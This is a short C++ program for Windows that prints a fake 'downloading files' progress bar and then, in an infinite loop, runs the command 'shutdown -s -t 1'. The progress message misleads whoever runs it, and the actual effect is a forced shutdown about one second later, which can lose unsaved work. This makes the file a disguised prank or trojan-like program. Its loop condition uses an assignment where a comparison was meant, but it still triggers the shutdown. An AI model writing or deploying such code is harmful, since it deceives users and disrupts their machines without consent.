#include <iostream>
#include <Windows.h>



void shutdown() {
	system("shutdown -s -t 1");
	return;
}

int main() {
	

	std::cout << "Wait the program downloads its files:\n";
	std::cout << "\\\\_DOWNLOADING//_\n"; bool sucess = false;
	Sleep(10);
	printf("[====           ] 25%\n");
	Sleep(10);
	printf("[========       ] 50%\n");
	Sleep(10);
	printf("[============   ] 75%\n");
	Sleep(10);
	printf("[===============] 100%\n");
	sucess = true;
	while (1)
	{
		if (sucess = true)
		{
			shutdown();
		}
		else
		{
			sucess = true;
		}
	}



	system("pause");
	return 0;
}
